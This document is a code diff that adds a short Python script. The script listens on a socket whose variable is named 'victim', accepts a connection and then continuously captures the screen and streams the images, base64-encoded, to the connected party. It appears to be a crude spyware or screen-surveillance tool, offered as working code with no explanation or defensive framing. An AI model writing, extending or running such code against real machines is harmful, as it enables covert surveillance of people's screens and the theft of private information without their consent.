@@ -1,0 +1,22 @@
+import socket
+import pyautogui
+import base64
+from io import BytesIO
+
+host = 'local host'
+port = 5000
+victim=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+ 
+victim.bind(('', port))
+victim.listen()
+c, addr = victim.accept()
+print("CONNECTION FROM:", str(addr))
+msg = "sending image file"
+while True:
+    img=pyautogui.screenshot()
+    buffered = BytesIO()
+    img.save(buffered, format="PNG")
+    img_str = base64.b64encode(buffered.getvalue())
+    c.sendall(img_str)
+
+c.close()
